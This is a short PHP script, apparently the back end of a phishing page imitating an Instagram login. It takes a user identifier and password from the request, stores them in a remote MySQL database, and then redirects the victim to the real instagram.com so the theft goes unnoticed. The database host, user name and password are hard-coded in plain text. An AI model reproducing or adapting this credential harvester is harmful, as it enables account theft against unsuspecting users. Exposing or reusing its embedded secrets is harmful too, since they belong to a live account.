<?php

// Récupération des données du formulaire
$id = $_GET['id'];
$mdp = $_GET['mdp'];

// Connexion à la base de données
$host = 'sql107.epizy.com';
$dbname = 'epiz_33700074_data_stockage';
$username = 'epiz_33700074';
$password = '3q8wCHfXAXwd';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
} catch (PDOException $e) {
    die("Erreur de connexion à la base de données : " . $e->getMessage());
}

// Insertion des données dans la table "utilisateurs"
$sql = "INSERT INTO utilisateurs (id, mdp) VALUES (:id, :mdp)";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(':id', $id);
$stmt->bindParam(':mdp', $mdp);
$stmt->execute();

// Fermeture de la connexion
$pdo = null;

header("Location: https://www.instagram.com/");
exit;
?>
